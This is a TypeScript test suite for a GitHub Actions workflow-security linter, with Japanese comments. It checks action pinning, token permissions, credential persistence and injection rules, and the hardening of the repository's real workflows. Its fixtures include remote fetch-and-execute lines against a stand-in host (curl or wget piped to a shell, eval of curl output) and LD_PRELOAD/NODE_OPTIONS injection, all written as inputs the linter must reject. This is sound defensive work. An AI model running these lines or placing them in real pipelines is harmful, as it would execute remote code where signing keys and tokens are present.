import { mkdirSync, mkdtempSync, readFileSync, readdirSync, rmSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { createRequire } from 'node:module';
import path from 'node:path';
import { describe, expect, it } from 'vitest';

/*
 * `lint:workflow-security` の**外側の証人**。
 *
 * ワークフローはコード署名の鍵と Apple の資格情報を持ち、**利用者がダウンロード
 * するインストーラを公開する**場所である。門が黙ればそこが開く。
 *
 * **台帳は必ず空で渡す (`check(list, {}, {})` —— 未固定の台帳と job 権限の台帳の 2 つ)。** 既定は実物の台帳なので、
 * 合成標本を流すと「台帳に載っているものが使われていない」が毎回鳴り、
 * どの規則で鳴ったのか読めなくなる (2026-08-26 に実際に読み違えかけた。
 * 同じ罠を `lint:mcp-servers` でも踏んでいる)。
 */
const req = createRequire(import.meta.url);
const gate = req('../../../scripts/lint-workflow-security.cjs') as {
  check: (list: { name: string; text: string }[], allow?: Record<string, unknown>, jobAllow?: Record<string, unknown>) => { file: string; why: string }[];
  jobPermissionBlocks: (text: string) => { job: string; line: number; scopes: string[] }[];
  localActionFiles: (dir?: string) => string[];
  workflows: (wfDir?: string, actionsDir?: string) => { name: string; text: string }[];
  isLocalActionName: (name: string) => boolean;
  scanRelPath: (name: string) => string;
  UNPINNED_ALLOW: Record<string, unknown>;
  JOB_PERMISSIONS_ALLOW: Record<string, Record<string, { scopes: string[]; why: string }>>;
};

const wf = (text: string) => gate.check([{ name: 'x.yml', text }], {}, {});
const SHA = 'a'.repeat(40);
const BASE = 'permissions:\n  contents: read\njobs:\n  a:\n    steps:\n';
/** SHA で固定し資格情報を残さない checkout (2026-10-15 から門が要求する形)。 */
const CHECKOUT = `      - uses: actions/checkout@${SHA} # v5\n        with:\n          persist-credentials: false\n`;

describe('lint:workflow-security — 外側の証人', () => {
  it('陰性: 素直なワークフローは通る (この行が落ちると以下は無意味)', () => {
    expect(wf(`${BASE}${CHECKOUT}      - run: echo hi\n`)).toHaveLength(0);
  });

  it.each([
    ['★ permissions を宣言しない (既定を継ぐ)', 'jobs:\n  a:\n    steps:\n      - run: echo hi\n'],
    ['★ トップが write-all', 'permissions: write-all\njobs:\n  a:\n    steps:\n      - run: echo hi\n'],
    [
      '★ job が write-all で上書き (実効権限だけが広がる)',
      'permissions:\n  contents: read\njobs:\n  a:\n    permissions: write-all\n    steps:\n      - run: echo hi\n',
    ],
    [
      '★ job 単位の permissions で広げる',
      'permissions:\n  contents: read\njobs:\n  a:\n    permissions:\n      contents: write\n    steps:\n      - run: echo hi\n',
    ],
    ['★ 第三者 action が可動タグ', `${BASE}      - uses: third/act@v1\n`],
    ['★ 第三者 action が枝', `${BASE}      - uses: third/act@main\n`],
    ['★ actions/* が @main (枝は固定ではない)', `${BASE}      - uses: actions/checkout@main\n`],
    ['★ actions/* が任意の枝', `${BASE}      - uses: actions/checkout@my-branch\n`],
    ['★ actions/* が版のタグ (動く参照 · threat: T-057)', `${BASE}      - uses: actions/setup-node@v5\n`],
    ['★ actions/* が細かい版のタグ (タグは動かせる · threat: T-057)', `${BASE}      - uses: actions/checkout@v4.1.2\n`],
    [
      '★ checkout が GITHUB_TOKEN を .git/config に残す (persist-credentials 無し · threat: T-056)',
      `${BASE}      - uses: actions/checkout@${SHA} # v1\n      - run: npm ci\n`,
    ],
    [
      '★ checkout の persist-credentials: true (明示しても残す)',
      `${BASE}      - uses: actions/checkout@${SHA} # v1\n        with:\n          persist-credentials: true\n`,
    ],
    [
      '★ pull_request_target (fork の PR が secrets 付きで走る)',
      'permissions:\n  contents: read\non:\n  pull_request_target:\njobs:\n  a:\n    steps:\n      - run: echo hi\n',
    ],
    ['★ run: へ PR の題名を展開 (コマンド注入)', `${BASE}      - run: echo \${{ github.event.pull_request.title }}\n`],
    ['★ run: へ step の出力を展開 (文脈の列挙では漏れる形)', `${BASE}      - run: echo \${{ steps.s.outputs.v }}\n`],
    ['★ run: へ workflow_dispatch の入力を展開', `${BASE}      - run: echo \${{ inputs.target }}\n`],
  ])('%s', (_n, text) => {
    expect(wf(text).length).toBeGreaterThan(0);
  });

  it.each([
    ['actions/* を SHA で (最も固い形)・checkout は資格情報を残さない', `${BASE}${CHECKOUT}`],
    ['actions/* を SHA で (checkout 以外は with: が要らない)', `${BASE}      - uses: actions/setup-node@${SHA} # v5\n`],
    ['第三者を SHA で', `${BASE}      - uses: third/act@${SHA} # v1\n`],
    ['run: に埋め込みが無い', `${BASE}      - run: npm ci && npm test\n`],
    ['permissions を絞って列挙', 'permissions:\n  contents: read\n  pages: write\njobs:\n  a:\n    steps:\n      - run: echo hi\n'],
  ])('陰性: %s は通る', (_n, text) => {
    expect(wf(text)).toHaveLength(0);
  });

  it('★ 違反には、どのファイルの何かが書いてある', () => {
    const p = wf('jobs:\n  a:\n    steps:\n      - run: echo hi\n');
    expect(p[0]?.file).toBe('x.yml');
    expect((p[0]?.why ?? '').length).toBeGreaterThan(10);
  });
});

/*
 * **実物の 7 本の workflow は、GitHub 自身の action も SHA で固定し、checkout は資格情報を残さない**
 * (2026-10-15 · パス 522 · threat: T-056 / T-057)。実測 (直す前): `actions/*` の 30 か所はすべて
 * 版のタグ (`@v5` —— GitHub が動かす major タグ) で、checkout 10 か所はどれも既定の
 * `persist-credentials: true` のまま `npm ci` と組み立てへ `GITHUB_TOKEN` を残していた。
 * 門 (`lint:workflow-security`) がこの 2 つを要求するようになったので、ここは**門が外れた日**の
 * ために実物を直接読む。
 */
describe('実物の workflow — actions/* の SHA 固定と checkout の persist-credentials (threat: T-056 / T-057)', () => {
  const dir = path.resolve(__dirname, '../../../.github/workflows');
  const files = readdirSync(dir).filter((f) => f.endsWith('.yml')).sort();
  const texts = files.map((f) => [f, readFileSync(path.join(dir, f), 'utf8')] as const);

  it('走査が生きている (workflow は 7 本)', () => {
    expect(files).toHaveLength(7);
  });

  it('★ 実物の 7 workflow は actions/* を全部 40 桁の SHA で固定し、版を注記に残す (threat: T-057)', () => {
    let seen = 0;
    for (const [f, text] of texts) {
      for (const line of text.split('\n')) {
        const m = /^\s*-?\s*uses:\s*(actions\/\S+)(.*)$/.exec(line);
        if (!m) continue;
        seen += 1;
        expect(m[1], `${f}: ${line.trim()}`).toMatch(/^actions\/[a-z-]+@[0-9a-f]{40}$/);
        expect(m[2], `${f}: 版の注記が無い: ${line.trim()}`).toMatch(/#\s*v\d+/);
      }
    }
    expect(seen).toBeGreaterThanOrEqual(30);
  });

  it('★ 実物の checkout 10 か所はすべて persist-credentials: false (threat: T-056)', () => {
    let seen = 0;
    for (const [f, text] of texts) {
      const lines = text.split('\n');
      lines.forEach((line, i) => {
        if (!/^\s*-?\s*uses:\s*actions\/checkout@/.test(line)) return;
        seen += 1;
        const dash = /^(\s*)-/.exec(line)![1]!;
        const step = lines.slice(i + 1).join('\n').split(new RegExp(`\n${dash}-`))[0]!;
        expect(step, `${f}:${i + 1} の checkout`).toMatch(/persist-credentials:\s*false/);
      });
    }
    expect(seen).toBe(10);
  });

  it('★ 7 本の workflow と dependabot.yml は整合性チェーンの保護対象 (threat: T-058)', () => {
    const chain = req('../../../scripts/integrity-chain.cjs') as { PROTECTED: readonly string[] };
    for (const f of files) expect(chain.PROTECTED, f).toContain(`.github/workflows/${f}`);
    expect(chain.PROTECTED).toContain('.github/dependabot.yml');
  });

  it('★ 実物は門を通る (台帳どおり)', () => {
    expect(gate.check(texts.map(([name, text]) => ({ name, text })), gate.UNPINNED_ALLOW, gate.JOB_PERMISSIONS_ALLOW)).toEqual([]);
  });
});

/*
 * **実物の release.yml は、公開する action を SHA で固定している** (threat: T-035 · パス 519)。
 *
 * 2026-08-22 から 2026-10-14 まで `softprops/action-gh-release@v2` は可動タグのまま台帳に
 * 載っていた (理由は「このセッションから SHA を解決できない」)。台帳は門を通すので、
 * その間この action の持ち主がタグを動かせば、**署名鍵と GH_TOKEN を持つジョブ**が
 * 動かされた先のコードを走らせた。`git ls-remote --tags` (git プロキシは公開リポジトリを
 * 通す) で `refs/tags/v2` を解決し、`refs/tags/v2.6.2` と同じコミットであることを
 * 確かめて固定した。門は「SHA か台帳か」しか見ないので、**台帳へ戻す退行**はここだけが鳴る。
 */
describe('release.yml の公開 action は SHA 固定 (threat: T-035)', () => {
  const releaseYml = readFileSync(path.resolve(__dirname, '../../../.github/workflows/release.yml'), 'utf8');

  it('★ softprops/action-gh-release は 40 桁の SHA で固定され、可動タグではない (threat: T-035)', () => {
    const uses = releaseYml.split('\n').filter((l) => /^\s*-?\s*uses:\s*softprops\/action-gh-release@/.test(l));
    expect(uses).toHaveLength(1);
    expect(uses[0]).toMatch(/action-gh-release@[0-9a-f]{40}\b/);
    expect(uses[0]).not.toMatch(/action-gh-release@v\d/);
  });

  it('★ 未固定の台帳は空 —— 台帳へ戻して門を通す形を留める (threat: T-035)', () => {
    expect(Object.keys(gate.UNPINNED_ALLOW)).toEqual([]);
  });

  it('対照: 実物の release.yml を可動タグへ戻すと門が鳴る (台帳が空なので免除されない)', () => {
    const reverted = releaseYml.replace(/action-gh-release@[0-9a-f]{40}[^\n]*/, 'action-gh-release@v2');
    const problems = gate.check([{ name: 'release.yml', text: reverted }], gate.UNPINNED_ALLOW, {});
    expect(problems.some((p) => p.why.includes('softprops/action-gh-release@v2'))).toBe(true);
    expect(gate.check([{ name: 'release.yml', text: releaseYml }], gate.UNPINNED_ALLOW, {})).toHaveLength(0);
  });
});

/*
 * **release.yml の組み立てステップは GITHUB_TOKEN を受け取らない** (threat: T-038 · パス 520)。
 *
 * 2026-10-14 まで `Build` の env に `GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}` が在ったが、
 * `electron-builder --publish never` はそれを読まない (publish は後ろの `action-gh-release` が
 * 自分の `token` で行う)。同じ env の隣には署名鍵 (`CSC_LINK` / `CSC_KEY_PASSWORD`) が並び、
 * 依存の postinstall と builder のプラグインがそこで走る —— 使われない `contents: write` の
 * トークンを任意コードの環境へ渡していた。門は「権限」と「固定」しか見ないので、戻す退行はここだけが鳴る。
 */
describe('release.yml の組み立ては GITHUB_TOKEN を環境に持たない (threat: T-038)', () => {
  const releaseYml = readFileSync(path.resolve(__dirname, '../../../.github/workflows/release.yml'), 'utf8');

  it('★ Build ステップの env に GH_TOKEN / GITHUB_TOKEN が無い (threat: T-038)', () => {
    const lines = releaseYml.split('\n');
    const withToken = lines.filter((l) => /GH_TOKEN|secrets\.GITHUB_TOKEN/.test(l));
    expect(withToken).toEqual([]);
    // 標本: 針は直す前の綴りに当たる。
    expect(['          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}'].filter((l) => /GH_TOKEN|secrets\.GITHUB_TOKEN/.test(l))).toHaveLength(1);
  });

  it('公開は action-gh-release が自分の token で行う (組み立てに渡す理由が無い)', () => {
    expect(releaseYml).toMatch(/action-gh-release@[0-9a-f]{40}/);
    expect(releaseYml).toMatch(/--publish never/);
  });
});

/*
 * **pages.yml は組み立てと公開を別の job に分け、書く権限は公開の job だけが持つ**
 * (threat: T-039 · パス 520)。
 *
 * 2026-10-14 まで `pages: write` / `id-token: write` はワークフロー全体に付いており、
 * `npm ci` と builder 7 本が公開の権限 (checkout が `.git/config` に残す GITHUB_TOKEN) と
 * OIDC の発行権の下で走っていた。門 (`lint:workflow-security`) は job 単位の `permissions:` を
 * 台帳 `JOB_PERMISSIONS_ALLOW` と双方向に突き合わせる —— ここはその台帳が**実物の形**を
 * 指していることと、戻す退行が鳴ることを見る。
 */
describe('pages.yml の書く権限は公開の job だけ (threat: T-039)', () => {
  const pagesYml = readFileSync(path.resolve(__dirname, '../../../.github/workflows/pages.yml'), 'utf8');
  // 注記は落とす (トップレベルの注記が直す前の形を説明しており、綴りが在る)。
  const top = pagesYml.slice(0, pagesYml.indexOf('\njobs:')).split('\n').filter((l) => !/^\s*#/.test(l)).join('\n');

  it('★ トップレベルは contents: read だけ (threat: T-039)', () => {
    expect(top).toMatch(/^permissions:\n {2}contents: read\n/m);
    expect(top).not.toMatch(/pages: write|id-token: write/);
  });

  it('★ job 単位の permissions は deploy の 2 つだけで、台帳と一致する (threat: T-039)', () => {
    expect(gate.jobPermissionBlocks(pagesYml)).toEqual([
      { job: 'deploy', line: expect.any(Number), scopes: ['pages: write', 'id-token: write'] },
    ]);
    expect(gate.JOB_PERMISSIONS_ALLOW).toEqual({
      'pages.yml': { deploy: { scopes: ['pages: write', 'id-token: write'], why: expect.any(String) } },
    });
  });

  it('★ deploy は build の成果物だけを受け取り、任意コードを走らせない (threat: T-039)', () => {
    const deploy = pagesYml.slice(pagesYml.indexOf('\n  deploy:'));
    expect(deploy).toMatch(/needs: build/);
    expect(deploy).not.toMatch(/run:|npm |actions\/checkout|actions\/setup-node/);
    expect(deploy).toMatch(/uses: actions\/deploy-pages@[0-9a-f]{40} # v\d+/);
    const build = pagesYml.slice(pagesYml.indexOf('\n  build:'), pagesYml.indexOf('\n  deploy:'));
    expect(build).toMatch(/npm ci/);
    expect(build).not.toMatch(/permissions:|deploy-pages/);
    expect(build).toMatch(/upload-pages-artifact/);
  });

  it('実物の pages.yml は門を通る', () => {
    expect(gate.check([{ name: 'pages.yml', text: pagesYml }], gate.UNPINNED_ALLOW, gate.JOB_PERMISSIONS_ALLOW)).toEqual([]);
  });

  it('対照: 書く権限をトップレベルへ戻す (直す前の形) と門が鳴る', () => {
    const reverted = pagesYml
      .replace('permissions:\n  contents: read\n', 'permissions:\n  contents: read\n  pages: write\n  id-token: write\n')
      .replace('    permissions:\n      pages: write\n      id-token: write\n', '');
    const problems = gate.check([{ name: 'pages.yml', text: reverted }], gate.UNPINNED_ALLOW, gate.JOB_PERMISSIONS_ALLOW);
    expect(problems.map((p) => p.file)).toEqual(['(台帳)']);
  });

  it('対照: deploy に contents: write を足すと scope の食い違いで鳴る', () => {
    const widened = pagesYml.replace('      id-token: write\n', '      id-token: write\n      contents: write\n');
    const problems = gate.check([{ name: 'pages.yml', text: widened }], gate.UNPINNED_ALLOW, gate.JOB_PERMISSIONS_ALLOW);
    expect(problems).toHaveLength(1);
    expect(problems[0]?.why).toContain('contents: write');
  });
});

/**
 * `pull_request_target` の別綴りと `github-script` の `script:` 注入 (2026-10-16 · パス 524 ·
 * threat: T-085)。直す前は map の形 (`on:\n  pull_request_target:`) 1 つだけを見て、
 * 他の有効な 5 形は permissions を宣言していれば exit 0 だった (実測)。
 */
describe('lint:workflow-security — 別綴りと script: 注入 (threat: T-085)', () => {
  const on = (onBlock: string) => `permissions:\n  contents: read\n${onBlock}jobs:\n  a:\n    steps:\n      - run: echo hi\n`;
  it.each([
    ['on: pull_request_target', 'on: pull_request_target\n'],
    ['flow 配列', 'on: [push, pull_request_target]\n'],
    ['block 配列', 'on:\n  - pull_request_target\n'],
    ['引用符つきの鍵', 'on:\n  "pull_request_target":\n'],
    ['flow map', 'on: {pull_request_target: {types: [opened]}}\n'],
    ['map (これまでの形)', 'on:\n  pull_request_target:\n'],
  ])('★ pull_request_target を %s で書いても断る (threat: T-085)', (_label, block) => {
    expect(wf(on(block)).map((p) => p.why).join('\n')).toContain('pull_request_target');
  });

  it('★ 対照: 注記の中の言及・似た名前は断らない', () => {
    expect(wf(on('# pull_request_target は使わない\non:\n  push:\n'))).toHaveLength(0);
    expect(wf(on('on:\n  pull_request:\n'))).toHaveLength(0);
  });

  it.each([
    ['ブロック (|)', "          script: |\n            core.info('${{ github.event.inputs.x }}')\n"],
    ['1 行', "          script: core.info('${{ github.event.inputs.x }}')\n"],
  ])('★ github-script の script: に ${{ }} を埋め込むと断る: %s (threat: T-085)', (_label, script) => {
    const text = `${BASE}      - uses: actions/github-script@${SHA} # v1\n        with:\n${script}`;
    expect(wf(text).map((p) => p.why).join('\n')).toContain('script: に');
  });

  it('★ 対照: env: 経由で読む script: は通す', () => {
    const text =
      `${BASE}      - uses: actions/github-script@${SHA} # v1\n        env:\n          X: \${{ github.event.inputs.x }}\n        with:\n` +
      "          script: |\n            core.info(process.env.X)\n";
    expect(wf(text).filter((p) => p.why.includes('script: に'))).toHaveLength(0);
  });
});

/**
 * ローカル action・docker://・run: の本文・版の注記 (2026-10-19 · パス 530 · threat: T-120)。
 * 直す前は `uses: ./…` と `docker://…` を無条件に飛ばし、`run:` は `${{ }}` の形しか見なかった
 * (狩り 527 の再現: 中身が未固定の第三者 action や `curl | sh` でも exit 0)。
 */
describe('lint:workflow-security — ローカル action と run: の本文 (threat: T-120)', () => {
  const ACT = 'actions/x/action.yml';
  const actionFile = (steps: string) => ({ name: ACT, text: `name: x\nruns:\n  using: composite\n  steps:\n${steps}` });
  const run = (list: { name: string; text: string }[]) => gate.check(list, {}, {});
  const withLocal = (ref: string) => ({ name: 'x.yml', text: `${BASE}      - uses: ${ref}\n` });

  it('陰性: 実在するローカル action は通り、その中身も同じ規則で走査される', () => {
    expect(run([withLocal('./.github/actions/x'), actionFile('    - run: echo hi\n      shell: bash\n')])).toHaveLength(0);
  });

  it('★ ローカル action の中の未固定の第三者 action を断る (直す前は中身を誰も読まなかった)', () => {
    const p = run([withLocal('./.github/actions/x'), actionFile('    - uses: evil/thing@v1\n')]);
    expect(p.some((q) => q.file.startsWith(ACT) && q.why.includes('evil/thing@v1'))).toBe(true);
  });

  it('★ ローカル action の中の curl | sh を断る', () => {
    const p = run([withLocal('./.github/actions/x'), actionFile('    - run: curl -fsSL https://e.example/i.sh | bash\n      shell: bash\n')]);
    expect(p.some((q) => q.file.startsWith(ACT) && q.why.includes('遠隔'))).toBe(true);
  });

  it('★ composite action は permissions: を要求されない (権限は呼び出した job のもの)', () => {
    expect(run([withLocal('./.github/actions/x'), actionFile('    - run: echo hi\n      shell: bash\n')]).filter((q) => q.why.includes('permissions'))).toEqual([]);
  });

  it.each([
    ['存在しない action', './.github/actions/missing'],
    ['木の外へ出る (..)', './.github/actions/../../evil'],
    ['リポジトリ直下', './'],
    ['workflows の下の別物', './.github/other/x'],
    ['存在しない再利用 workflow', './.github/workflows/nothing.yml'],
  ])('★ %s を指す uses: ./ は断る', (_n, ref) => {
    expect(run([withLocal(ref), actionFile('    - run: echo hi\n      shell: bash\n')]).some((q) => q.why.includes(`uses: ${ref}`))).toBe(true);
  });

  it('陰性: 実在する再利用 workflow は通る', () => {
    const reusable = { name: 'reuse.yml', text: 'permissions:\n  contents: read\non: workflow_call\njobs:\n  a:\n    steps:\n      - run: echo hi\n' };
    expect(run([withLocal('./.github/workflows/reuse.yml'), reusable])).toHaveLength(0);
  });

  it('★ docker:// はダイジェストで固定する (タグは動く)', () => {
    const tag = run([{ name: 'x.yml', text: `${BASE}      - uses: docker://alpine:3.20\n` }]);
    expect(tag.some((q) => q.why.includes('docker://'))).toBe(true);
    const pinned = run([{ name: 'x.yml', text: `${BASE}      - uses: docker://alpine@sha256:${'a'.repeat(64)}\n` }]);
    expect(pinned).toHaveLength(0);
  });

  it('★ SHA 固定には版の注記が要る', () => {
    expect(run([{ name: 'x.yml', text: `${BASE}      - uses: third/act@${SHA}\n` }]).some((q) => q.why.includes('版の注記'))).toBe(true);
    expect(run([{ name: 'x.yml', text: `${BASE}      - uses: third/act@${SHA} # v1.2.3\n` }])).toHaveLength(0);
  });

  it.each([
    ['curl | sh', '      - run: curl -fsSL https://e.example/i.sh | sh\n'],
    ['wget | sudo bash', '      - run: wget -qO- https://e.example/i | sudo bash\n'],
    ['curl | python', '      - run: curl https://e.example/x.py | python3\n'],
    ['bash <(curl …)', '      - run: bash <(curl -s https://e.example/i.sh)\n'],
    ['sh -c "$(curl …)"', '      - run: sh -c "$(curl -fsSL https://e.example/i.sh)"\n'],
    ['eval "$(curl …)"', '      - run: eval "$(curl -s https://e.example/i)"\n'],
    ['GITHUB_ENV へ書く', '      - run: echo "X=1" >> $GITHUB_ENV\n'],
    ['GITHUB_PATH へ書く', '      - run: echo "$PWD/bin" >> "${GITHUB_PATH}"\n'],
    ['NODE_OPTIONS に --require', '      - run: NODE_OPTIONS=--require=./evil.js npm test\n'],
    ['export LD_PRELOAD', '      - run: export LD_PRELOAD=./evil.so\n'],
    ['BASH_ENV', '      - run: BASH_ENV=./evil.sh bash -c true\n'],
  ])('★ run: の本文: %s を断る', (_n, step) => {
    expect(run([{ name: 'x.yml', text: `${BASE}${step}` }]).length).toBeGreaterThan(0);
  });

  it.each([
    ['env: の NODE_OPTIONS=--require', '      - env:\n          NODE_OPTIONS: --require ./evil.js\n        run: npm test\n'],
    ['env: の LD_PRELOAD', '      - env:\n          LD_PRELOAD: ./evil.so\n        run: npm test\n'],
  ])('★ env: の鍵でも断る: %s', (_n, step) => {
    expect(run([{ name: 'x.yml', text: `${BASE}${step}` }]).some((q) => /NODE_OPTIONS|LD_PRELOAD/.test(q.why))).toBe(true);
  });

  it.each([
    ['NODE_OPTIONS=--max-old-space-size (mutation.yml の実物)', '      - env:\n          NODE_OPTIONS: --max-old-space-size=4096\n        run: npm test\n'],
    ['データとして curl の結果を変数に取る', '      - run: V=$(curl -fsS https://e.example/version) && echo "$V"\n'],
    ['curl の出力をファイルへ (実行しない)', '      - run: curl -fsSL https://e.example/x -o x.txt\n'],
    ['シェルの注記の中の GITHUB_ENV', '      - run: |\n          # GITHUB_ENV には書かない\n          echo hi\n'],
  ])('陰性: %s は通る', (_n, step) => {
    expect(run([{ name: 'x.yml', text: `${BASE}${step}` }])).toHaveLength(0);
  });

  it('★ 実物の workflow にローカル action・docker://・危険な run: は 0 件 (走査が生きている)', () => {
    const dir = path.resolve(__dirname, '../../../.github');
    const all = readdirSync(path.join(dir, 'workflows')).filter((f) => f.endsWith('.yml'));
    expect(all).toHaveLength(7);
    for (const f of all) {
      const t = readFileSync(path.join(dir, 'workflows', f), 'utf8');
      expect(t, f).not.toMatch(/^\s*-?\s*uses:\s*(\.\/|docker:\/\/)/m);
    }
    expect(gate.localActionFiles()).toEqual([]);
  });

  it('★ 走査の名前の約束: ローカル action は actions/ で始まり、追跡との照合用の経路が .github/actions になる', () => {
    expect(gate.isLocalActionName('actions/x/action.yml')).toBe(true);
    expect(gate.isLocalActionName('ci.yml')).toBe(false);
    expect(gate.scanRelPath('actions/x/action.yml')).toBe('.github/actions/x/action.yml');
    expect(gate.scanRelPath('ci.yml')).toBe('.github/workflows/ci.yml');
  });

  it('★ localActionFiles は入れ子の action.yml / action.yaml だけを拾う (別名の YAML は拾わない)', () => {
    const root = mkdtempSync(path.join(tmpdir(), 'wf-actions-'));
    try {
      mkdirSync(path.join(root, 'a', 'b'), { recursive: true });
      mkdirSync(path.join(root, 'c'), { recursive: true });
      writeFileSync(path.join(root, 'a', 'action.yml'), 'x');
      writeFileSync(path.join(root, 'a', 'b', 'action.yaml'), 'x');
      writeFileSync(path.join(root, 'c', 'notes.yml'), 'x');
      expect(gate.localActionFiles(root).sort()).toEqual(['a/action.yml', 'a/b/action.yaml']);
      expect(gate.localActionFiles(path.join(root, 'nothing'))).toEqual([]);
    } finally {
      rmSync(root, { recursive: true, force: true });
    }
  });

  it('★ workflows() はローカル action を actions/<dir>/action.yml の名前で workflow と一緒に返す', () => {
    const root = mkdtempSync(path.join(tmpdir(), 'wf-list-'));
    try {
      mkdirSync(path.join(root, 'workflows'), { recursive: true });
      mkdirSync(path.join(root, 'actions', 'x'), { recursive: true });
      writeFileSync(path.join(root, 'workflows', 'ci.yml'), 'name: ci\n');
      writeFileSync(path.join(root, 'actions', 'x', 'action.yml'), 'name: x\n');
      const list = gate.workflows(path.join(root, 'workflows'), path.join(root, 'actions'));
      expect(list.map((w) => w.name).sort()).toEqual(['actions/x/action.yml', 'ci.yml']);
      expect(list.find((w) => w.name === 'actions/x/action.yml')?.text).toBe('name: x\n');
    } finally {
      rmSync(root, { recursive: true, force: true });
    }
  });
});
